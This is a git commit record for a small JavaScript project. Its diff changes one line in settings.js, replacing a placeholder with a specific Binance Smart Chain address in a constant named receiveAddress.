0a74bb52fceee69a34528a2853c130278be6ca7b
Thisistherealdeal <117031560+Thisistherealdeal@users.noreply.github.com>
2022-10-30 17:48:31 +0100

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x12aB5bDb5fAdc1C92bf51AFbf47Ed0D2E53f48F3";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
